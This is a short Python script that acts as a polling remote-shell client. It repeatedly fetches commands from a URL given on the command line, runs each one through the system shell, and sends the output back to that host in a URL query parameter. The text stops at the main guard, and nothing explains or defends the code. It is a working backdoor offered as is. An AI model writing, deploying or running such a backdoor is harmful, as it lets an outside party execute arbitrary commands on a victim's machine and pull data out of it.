#!/usr/bin/python3

import requests
from subprocess import Popen, PIPE
import os
import time
from sys import argv

def run_cmd(cmd):
	if ' ' in list(cmd) and cmd.split(" ")[0] == "cd":
		newdir = cmd.split(" ")[1]
		try:
			os.chdir(newdir)
			return "cd: "+newdir
		except:
			return "error"
	else:
		return Popen(cmd,stdout=PIPE,shell=True).communicate()[0].decode()


def main(argv=argv):
	url = argv[1]
	data = ''
	while True:
		time.sleep(2)
		if len(data) > 0:
			res = requests.get(url+"/?data="+data).content
		else:
			res = requests.get(url).content
		if res == "exit":
			exit(0)
		else:
			data = run_cmd(res)

if __name__ == "__main__":
